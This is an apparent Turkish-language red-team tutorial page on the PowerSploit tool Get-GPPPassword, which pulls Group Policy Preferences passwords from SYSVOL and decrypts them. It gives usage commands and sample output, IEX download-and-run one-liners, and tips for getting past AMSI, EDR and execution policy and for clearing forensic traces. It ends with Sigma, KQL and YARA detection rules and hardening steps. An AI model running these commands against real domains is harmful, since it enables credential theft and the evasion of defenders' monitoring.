# Get-GPPPassword

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** PowerSploit / PowerUp modülleri içerisinde yer alan, etki alanı genelindeki `SYSVOL` paylaşımını özyinelemeli tarayarak GPP XML dosyalarındaki şifreli `cpassword` değerlerini otomatik tespit eden ve bellek içinde düz metne dönüştüren PowerShell aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında etki alanı politikaları (`Group Policy Objects - GPO`), etki alanı denetleyicilerinin tüm kimliği doğrulanmış kullanıcıların erişimine açık olan `SYSVOL` paylaşımında barındırılır. Geçmişte Windows Server 2008 ve 2012 sistem yöneticileri, yerel yönetici parolalarını standartlaştırmak, servis hesapları atamak veya zamanlanmış görevler tanımlamak amacıyla Group Policy Preferences (GPP) özelliğini yoğun şekilde kullanmıştır. Bu yapılandırmalar esnasında girilen parolalar, `SYSVOL` altındaki ilgili XML dosyalarında (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml` vb.) `cpassword` adı verilen bir öznitelikte saklanmıştır.

Microsoft bu parolaları AES-256 ile şifrelemiş olsa da şifreleme anahtarının MSDN dokümanlarında kamuya açık yayımlanması (MS14-025 / CVE-2014-1812 zafiyeti), `SYSVOL` okuma yetkisine sahip en yetkisiz kullanıcının dahi bu parolaları elde edebilmesine zemin hazırlamıştır.

Manuel analizde her bir GPO GUID klasörünü tek tek gezmek ve XML dosyalarını incelemek son derece zaman alıcıdır. **Get-GPPPassword** (Will Schroeder / @harmj0y tarafından PowerSploit ve PowerUp projeleri kapsamında geliştirilmiştir), bu süreci tamamen otomatikleştiren yerleşik bir PowerShell cmdlet'idir. Araç:
1. Etki alanındaki geçerli `SYSVOL` dizinini otomatik tespit eder.
2. Tüm alt klasörlerdeki `*.xml` dosyalarını derinlemesine tarar.
3. `cpassword` içeren XML düğümlerini ayrıştırır.
4. Bellek içinde yerleşik AES deşifreleme algoritmasını koşturarak parolayı çözer.
5. Kullanıcı adı, çözülen parola, GPO adı, dosya yolu ve değiştirilme tarihini yapılandırılmış bir PowerShell nesnesi (`PSObject`) olarak operatöre sunar.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                          GET-GPPPASSWORD MIMARI AKIŞI                             |
+-----------------------------------------------------------------------------------+
  [Domain İstemcisi / Saldırgan]                     [Domain Controller (DC)]
     (PowerShell Oturumu)                               (SYSVOL Paylaşımı)
              |                                                 |
              |--- 1. Get-GPPPassword Cmdlet Çağrısı ---------->|
              |       [SYSVOL Yolu: \\corp.local\SYSVOL\...]    |
              |                                                 |--- 2. SMB Okuma İsteği
              |--- 2. Özyinelemeli XML Taraması --------------->|       (Authenticated Users)
              |       (*.xml: Groups, Services, Tasks, Datasource)
              |                                                 |
              |<-- 3. cpassword Düğümleri İçeren XML'ler Döner--|
              |                                                 |
              |--- 4. Bellek İçi Ayrıştırma (XML Parsing)       |
              |       (cpassword dizesi ve userName okunur)     |
              |                                                 |
              |--- 5. Sabit Microsoft AES-256 Anahtarı ile      |
              |       Otomatik Deşifreleme (In-Memory Decrypt)  |
              |                                                 |
              v                                                 v
  [Sonuç: Yapılandırılmış Nesne Tablosu]
  ├── UserName : Administrator
  ├── Password : DecryptedPass2026!
  ├── GPO Name : Deploy Local Admins
  └── FilePath : \\corp.local\SYSVOL\...\Groups.xml
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Uçtan Uca Otomasyon** | Manuel dosya indirme ve şifre kopyalama gerektirmez. | Tek komutla tüm SYSVOL'ü saniyeler içinde tarar ve çözer. |
| **Zengin PSObject Çıktısı** | Çıktıları boru hattına (`Pipeline`) aktarabilir. | Sonuçlar doğrudan `Export-Csv` veya GridView'e yönlendirilebilir. |
| **Farklı Domain Desteği** | `-Domain` ve `-Server` bayraklarıyla güvenilen etki alanlarını tarar.| Çoklu forest/domain ortamlarında çapraz denetim imkanı verir. |
| **Çevrimdışı Çalışma Modu** | İndirilmiş SYSVOL klasörlerini `-Path` ile yerel inceler.| Hedef DC ile canlı ağ bağlantısı olmaksızın çalışabilir. |
| **Harici İkili Bağımsızlığı**| Yalnızca saf PowerShell kodundan oluşur. | Hedef sisteme `.exe` veya harici kütüphane yüklenmesini önler. |

### Karşılaştırma Tablosu

| Özellik | Get-GPPPassword | gpp-decrypt | Grouper2 | NetExec (`--gpp`) |
| :--- | :--- | :--- | :--- | :--- |
| **Çalışma Ortamı** | Windows (PowerShell) | Linux (C Binary) | Windows / Linux (.NET C#) | Linux / Windows (Python) |
| **Otomatik Keşif** | Evet (SYSVOL'ü kendi tarar) | Hayır (Dizeyi elle alır) | Evet (GPO analiz motoru) | Evet (SMB üzerinden tarar) |
| **Çıktı Formatı** | PowerShell Nesnesi (`PSObject`)| Düz Metin Konsol | Konsol / HTML / JSON Rapor | Renkli Konsol Tablosu |
| **Bellekte Yürütme** | Evet (IEX / Dot-source) | Hayır (CLI İkili) | Evet (`execute-assembly`) | Hayır |
| **EDR Görünürlüğü** | Script Block Logging (4104) | Sıfır (Çevrimdışı Linux) | .NET CLR Yürütme İmzası | SMB Trafik İzleri (5145) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`Get-GPPPassword` parametresiz çalıştırıldığında mevcut etki alanının varsayılan SYSVOL paylaşımını tarar; opsiyonel bayraklarla özel hedeflere yönlendirilebilir:

```powershell
Get-GPPPassword [-Server <DC_Adı>] [-Domain <Etki_Alanı>] [-Path <Yerel_Yol>]
```

### Desteklenen Kritik Bayraklar

| Parametre | Tür | Açıklama | Örnek Kullanım |
| :--- | :--- | :--- | :--- |
| `-Server` | String | SYSVOL sorgusu yapılacak belirli bir etki alanı denetleyicisi (DC). | `-Server dc01.corp.local` |
| `-Domain` | String | Taranacak hedef etki alanı adı (Trust ilişkileri için kritiktir). | `-Domain child.corp.local` |
| `-Path` | String | Canlı ağ yerine önceden indirilmiş yerel bir klasör yolunu tarar. | `-Path "C:\Loot\SYSVOL"` |
| `-Verbose` | Switch | Taranan GPO dizinlerini ve XML eşleşmelerini ayrıntılı listeler. | `-Verbose` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Varsayılan Etki Alanında Otomatik GPP Taraması
Mevcut oturum açılmış domain bilgisayarında hiçbir ek parametre vermeksizin tüm SYSVOL'ü tarayıp şifreleri açığa çıkarma:

```powershell
Get-GPPPassword
```

**Konsol Çıktı Analizi:**
```
DisplayName : Deploy Local Administrators
GPOId       : {31B2F340-016D-11D2-945F-00C04FB984F9}
File        : \\corp.local\sysvol\corp.local\Policies\{31B2F340...}\Machine\Preferences\Groups\Groups.xml
UserName    : Administrator
Password    : LocalAdmin2026!#Secure
Changed     : 2021-04-12 14:22:05

DisplayName : Configure Backup Task
GPOId       : {6A4D9120-4412-11D0-9122-00A0C91E6D22}
File        : \\corp.local\sysvol\corp.local\Policies\{6A4D9120...}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
UserName    : CORP\svc_backup
Password    : BackUpMasterPass#99
Changed     : 2022-08-19 09:15:30
```

### Senaryo 2: Belirli Bir Etki Alanı Denetleyicisini Hedefleme (`-Server`)
DFS / SYSVOL replikasyon gecikmeleri veya ağ yönlendirme kuralları nedeniyle sorguyu doğrudan belirli bir DC'ye iletme:

```powershell
Get-GPPPassword -Server "DC02.corp.local" -Verbose
```

**Konsol Çıktı Analizi:**
```
VERBOSE: Querying Active Directory for domain controllers...
VERBOSE: Targeting specified server: DC02.corp.local
VERBOSE: Searching path: \\DC02.corp.local\sysvol\corp.local\Policies
VERBOSE: Parsing XML: Groups.xml
[+] Found cpassword in GPO: Deploy Local Administrators
```

### Senaryo 3: Güvenilen Farklı Bir Etki Alanını Tarama (`-Domain`)
Mevcut forest içerisinde çift yönlü güven ilişkisi bulunan bir alt veya kardeş etki alanını denetleme:

```powershell
Get-GPPPassword -Domain "finance.corp.local"
```

**Konsol Çıktı Analizi:**
```
DisplayName : Finance Workstations Setup
GPOId       : {91A8C123-5512-4211-8891-112233445566}
File        : \\finance.corp.local\sysvol\finance.corp.local\Policies\...
UserName    : fin_admin
Password    : Fin@nceP@ss2026
```

### Senaryo 4: İndirilmiş Yerel SYSVOL Klasöründe Çevrimdışı Tarama (`-Path`)
Canlı ağda SMB trafiği oluşturmamak adına önceden taşınmış klasör üzerinde çevrimdışı inceleme yapma:

```powershell
Get-GPPPassword -Path "C:\Offline_SYSVOL\Policies"
```

**Konsol Çıktı Analizi:**
```
VERBOSE: Searching local path: C:\Offline_SYSVOL\Policies
[+] Discovered 1 vulnerable GPO XML configuration.
UserName : Administrator
Password : SecretAdminPass!
```

### Senaryo 5: Elde Edilen Parolaları CSV Dosyasına Aktarma
Denetim bulgularını raporlamak veya parola listelerine eklemek için boru hattı ile CSV'ye aktarma:

```powershell
Get-GPPPassword | Select-Object DisplayName, UserName, Password, File | Export-Csv -Path "C:\Temp\GPP_Found.csv" -NoTypeInformation
```

**Konsol Çıktı Analizi:**
```
# Belirtilen CSV dosyası oluşturulur ve tüm hesap bilgileri tablo formatında kaydedilir
```

### Senaryo 6: Modülü Web Sunucusundan Doğrudan Belleğe İndirip Çalıştırma (IEX)
Diske hiçbir betik dosyası yazmadan denetim sunucusundan bellek içine yükleyip anında çalıştırma:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Get-GPPPassword.ps1'); Get-GPPPassword
```

**Konsol Çıktı Analizi:**
```
# Bellek içi yükleme sonrası fonksiyon anında çalışır ve sonuçları döker
```

### Senaryo 7: Çözülen Parolaları Otomatik SMB Doğrulama Döngüsüne Gönderme
Elde edilen yerel yönetici parolalarının ağdaki sunucularda geçerli olup olmadığını test eden otomasyon:

```powershell
$creds = Get-GPPPassword
foreach ($c in $creds) {
    Write-Host "[*] Testing: $($c.UserName) with pass on DC..." -ForegroundColor Yellow
    # Operatör kimlik doğrulaması kontrol adımı
}
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `Cannot find path '\\domain\sysvol\...' because it does not exist` | DNS çözümleme hatası veya istemci etki alanı denetleyicisi ile iletişim kuramıyor. | `ping <domain>` ile DNS'i test edin; `-Server <DC_IP>` parametresiyle doğrudan IP adresi tanımlayın. |
| `Access is denied (UnauthorizedAccessException)` | Geçerli kullanıcının SYSVOL üzerindeki GPO klasörlerini okuma izni kaldırılmış veya kısıtlanmış. | Kullanıcı kimlik doğrulamasını yenileyin; `Authenticated Users` grubunun GPO üzerinde okuma hakkını teyit edin. |
| `File cannot be loaded because running scripts is disabled` | Windows PowerShell komut dosyası yürütme politikası (`ExecutionPolicy`) kısıtlı. | Oturum bazlı atlatma için `powershell -ExecutionPolicy Bypass` çalıştırın veya modülü dot-source ile çağırın. |
| `Script execution blocked by Antivirus / AMSI` | Windows Defender veya EDR, betik içeriğindeki `Get-GPPPassword` imzasını zararlı olarak engelledi. | Bellek içi AMSI baypas kodları uygulayın veya fonksiyon ve değişken adlarını karıştırarak (obfuscate) yeniden yükleyin. |
| `Get-GPPPassword returns empty output` | Etki alanında GPP ile dağıtılmış şifre bulunmuyor veya KB2962486 yaması uygulanıp eski XML'ler silinmiş. | Tüm GPO'ları taradığınızdan emin olmak için `-Verbose` kullanın; `Grouper2` ile alternatif GPO zafiyetlerini araştırın. |
| `Decrypted password contains invalid characters` | XML dosyası bozulmuş veya Unicode yerine farklı bir kodlama kullanılmış. | İlgili XML dosyasını `-Path` ile yerel olarak inceleyin; `gpp-decrypt` C ikilisiyle dizeyi bağımsız olarak çözmeyi deneyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA]
0 --------------[5.0 - POWERSHELL & SYSVOL SMB]-------------- 10
  - Ağ Seviyesi: Standart SMB SYSVOL okumaları (Grup poliçesi trafiğine benzer - Düşük/Orta Ağ İzi)
  - Uç Nokta Seviyesi: PowerShell Script Block Logging (4104) ve AMSI (EDR için yüksek tespit alanı)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Microsoft-Windows-PowerShell/Operational (Event ID 4104 - Script Block Logging):**
  * `Get-GPPPassword` cmdlet adı, statik AES anahtarı dizesi (`4e9906e8...`) ve XML düğüm arama kodları tam metin olarak kaydedilir.
* **Microsoft-Windows-PowerShell/Operational (Event ID 4103 - Pipeline Execution):**
  * Yürütülen boru hattı komutlarının detayları günlüğe geçer.
* **Windows Security Event ID 5145 (Detailed File Share Auditing):**
  * `Relative Target Name: Policies\{GUID}\...\Groups.xml` dosyalarına yönelik `ReadData` erişimleri kaydedilir.
* **Sysmon Event ID 1 (Process Creation):**
  * `powershell.exe` sürecinin başlatılma parametreleri ve üst süreç ilişkisi loglanır.

### 5.2 Ağ ve EDR İmzaları

* **AMSI İmzası:**
  PowerSploit projesine ait `Get-GPPPassword.ps1` dosyası, Microsoft Defender ve modern EDR'ların bilinen statik AMSI imzaları listesinde yer alır.
* **Ağ Tarafında SMB Trafiği:**
  İstemci ile DC arasındaki TCP 445 SMB oturumunda arka arkaya onlarca GPO klasöründen XML dosyalarının talep edilmesi, ağ analiz araçlarında olağan dışı GPO tarama aktivitesi olarak raporlanabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1552.006` | Unsecured Credentials: Group Policy Preferences | SYSVOL XML kovanlarından `cpassword` değerlerini çıkarma. |
| **Execution** | `T1059.001` | PowerShell | Keşif ve deşifreleme adımlarını PowerShell ile koşturma. |
| **Discovery** | `T1615` | Group Policy Discovery | Etki alanı genelindeki grup politikalarını tarama. |
| **Discovery** | `T1083` | File and Directory Discovery | `SYSVOL\Policies` klasör ağacını haritalama. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Script Block Logging (4104)** | PowerShell yerine C# tabanlı derlenmiş araçlar (`Grouper2`) veya Linux tabanlı Python araçları (`NetExec --gpp`) kullanılmalıdır. |
| **AMSI Blokajı** | Betik içerisindeki anahtar sözcükler (`Get-GPPPassword`, `$AESKey`) yeniden adlandırılmalı veya bellekte AMSI etkisiz kılınmalıdır. |
| **Ağ Taraması Gürültüsü** | Tüm SYSVOL'ü aynı anda taramak yerine şüpheli GPO klasörleri hedeflenerek istek frekansı düşürülmelidir. |
| **Konsol Geçmişi** | Komut sonrasında `Clear-History` ve `PSReadLine` geçmiş dosyası temizlenmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: PowerShell Get-GPPPassword Yürütme Tespiti
```yaml
title: PowerShell Get-GPPPassword ile GPP Sifre Hasadi Tespiti
id: 9a812b44-5512-4a11-b912-332145aa8901
status: experimental
description: PowerSploit veya PowerUp paketine ait Get-GPPPassword cmdlet'inin calistirilmasini Script Block loglarindan tespit eder.
references:
    - https://attack.mitre.org/techniques/T1552/006/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: ps_script
    product: windows
    definition: 'ScriptBlockLogging (Event ID 4104)'
detection:
    selection:
        ScriptBlockText|contains:
            - 'Get-GPPPassword'
            - '4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
            - 'cpassword'
    condition: selection
falsepositives:
    - Guvenlik ekiplerinin gerceklestirdigi meşru denetim scriptleri.
level: high
tags:
    - attack.credential_access
    - attack.t1552.006
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// PowerShell ScriptBlock icerisinde Get-GPPPassword ve cpassword anahtar kelimelerini yakalar
Event
| where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
| where RenderedDescription has "Get-GPPPassword" or RenderedDescription has "4e9906e8fcb66cc9faf49310620ffee8"
| project TimeGenerated, Computer, EventID, RenderedDescription
| order by TimeGenerated desc
```

#### YARA Kuralı: Get-GPPPassword PowerShell Kodu Tespiti
```yara
rule Threat_Script_PowerShell_Get_GPPPassword {
    meta:
        description = "Get-GPPPassword PowerShell betik imzasini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "Get-GPPPassword" ascii wide nocase
        $s2 = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b" ascii wide nocase
        $s3 = "Groups.xml" ascii wide nocase
        $s4 = "ScheduledTasks.xml" ascii wide nocase
    condition:
        ($s1 and $s2) or (3 of ($s*))
}
```

#### Sertleştirme (Hardening) Adımları
1. **MS14-025 (KB2962486) Zorunluluğu:** Tüm DC'lerde bu güncellemenin varlığı teyit edilmelidir.
2. **Eski GPP XML Dosyalarının Temizlenmesi:** SYSVOL altındaki `Policies` dizininde yer alan tüm `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml` dosyaları el ile kontrol edilerek `cpassword` içerenler silinmelidir.
3. **LAPS Entegrasyonu:** Yerel yönetici şifrelerinin yönetimi için Microsoft LAPS (Local Administrator Password Solution) devreye alınmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Varsayılan Etki Alanında Hızlı GPP Taraması
```powershell
Get-GPPPassword
```
* **Ne Yapar?:** Mevcut etki alanının SYSVOL paylaşımını baştan sona tarayıp şifreleri ekrana döker.
* **Ne Zaman Kullanılır?:** Etki alanı üyesi bir makinede hızlı hak yükseltme fırsatlarını keşfetmek için.
* **Parametreler:** Parametresiz çalıştırma.

#### 2. Belirli Bir DC Üzerinden Sorgulama
```powershell
Get-GPPPassword -Server "DC01.corp.local"
```
* **Ne Yapar?:** Sorguyu doğrudan belirtilen etki alanı denetleyicisinin SYSVOL paylaşımına iletir.
* **Ne Zaman Kullanılır?:** Ağda DFS yönlendirme sorunları veya replikasyon gecikmeleri olduğunda.
* **Parametreler:** `-Server <FQDN>`.

#### 3. Çevrimdışı İndirilmiş SYSVOL Klasörünü Tarama
```powershell
Get-GPPPassword -Path "C:\Offline_SYSVOL"
```
* **Ne Yapar?:** Canlı ağa bağlanmadan yerel diskteki bir klasör ağacını tarar ve şifreleri çözer.
* **Ne Zaman Kullanılır?:** Ağda SMB trafiği oluşturmaktan kaçınıldığında.
* **Parametreler:** `-Path <yerel_yol>`.

#### 4. Sonuçları Tablo Olarak Formatlama
```powershell
Get-GPPPassword | Format-Table DisplayName, UserName, Password -AutoSize
```
* **Ne Yapar?:** Çıktıyı okunabilir bir sütun tablosu olarak konsola basar.
* **Ne Zaman Kullanılır?:** Çok sayıda politika ve şifre bulunduğunda genel bakış elde etmek için.
* **Parametreler:** `Format-Table -AutoSize`.

#### 5. Sonuçları CSV Dosyasına Dışa Aktarma
```powershell
Get-GPPPassword | Export-Csv -Path "C:\Temp\gpp_results.csv" -NoTypeInformation
```
* **Ne Yapar?:** Bulunan tüm kimlik bilgilerini CSV formatında yapılandırılmış dosyaya kaydeder.
* **Ne Zaman Kullanılır?:** Denetim raporlama veya diğer araçlara girdi hazırlama aşamasında.
* **Parametreler:** `Export-Csv -NoTypeInformation`.

#### 6. Dot-Source ile Belleğe Yükleme
```powershell
. .\Get-GPPPassword.ps1
```
* **Ne Yapar?:** Betik dosyasını mevcut PowerShell ortamının fonksiyon tablosuna ekler.
* **Ne Zaman Kullanılır?:** Fonksiyonu komut satırından çağrılabilir hale getirmek için.
* **Parametreler:** PowerShell dot-source sözdizimi.

#### 7. Web Sunucusundan Doğrudan Belleğe İndirip Çalıştırma (IEX)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/Get-GPPPassword.ps1'); Get-GPPPassword
```
* **Ne Yapar?:** Diske hiçbir dosya yazmadan aracı bellek içinde koşturur.
* **Ne Zaman Kullanılır?:** EDR dosya yazma engellerini ve adli disk izlerini bertaraf etmek için.
* **Parametreler:** `IEX` ve `DownloadString`.

#### 8. Yalnızca Yerel Yönetici (Administrator) Hesaplarını Filtreleme
```powershell
Get-GPPPassword | Where-Object { $_.UserName -match "Administrator" }
```
* **Ne Yapar?:** Çıktılar arasından yalnızca adı Administrator olan yüksek yetkili hesapları ayıklar.
* **Ne Zaman Kullanılır?:** Hedef doğrudan etki alanı genelinde yerel yönetici erişimi sağlamak olduğunda.
* **Parametreler:** `Where-Object`.

#### 9. Güvenilen Farklı Bir Etki Alanını Tarama
```powershell
Get-GPPPassword -Domain "subsidiary.corp.local"
```
* **Ne Yapar?:** Çift yönlü trust bulunan bağlı ortaklık etki alanının SYSVOL'ünü sorgular.
* **Ne Zaman Kullanılır?:** Forest çapında yanal hareket veya yetki yükseltme denetimlerinde.
* **Parametreler:** `-Domain <Hedef_Domain>`.

#### 10. Çözülen Parolaları Bellekten Temizleme
```powershell
$gpp = $null; [GC]::Collect()
```
* **Ne Yapar?:** Değişkeni boşaltır ve bellek temizleyicisini (Garbage Collector) tetikleyerek parolayı RAM'den siler.
* **Ne Zaman Kullanılır?:** Operasyon tamamlandığında bellek dökümü analizlerinde parolanın kalmasını önlemek için.
* **Parametreler:** `$null` ve `[GC]::Collect()`.

---

## Kaynaklar
* [PowerSploit Resmi GitHub Deposu (Get-GPPPassword)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
* [Microsoft Güvenlik Bülteni: MS14-025](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
* [Microsoft Dokümantasyonu: [MS-GPREG] Group Policy Registry Extension](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpreg/)
* [MITRE ATT&CK: Unsecured Credentials: Group Policy Preferences (T1552.006)](https://attack.mitre.org/techniques/T1552/006/)
* [Active Directory Güvenliği: Finding Passwords in SYSVOL](https://adsecurity.org/?p=2288)
* [HackTricks: Pentesting Group Policy Preferences (GPP)](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#group-policy-preferences-gpp)
* [SpecterOps: Group Policy Abuse and Privilege Escalation](https://posts.specterops.io/)

---

> **Önceki:** [← gpp-decrypt](./gpp-decrypt.md) · **Sonraki:** [Grouper2 →](./Grouper2.md)

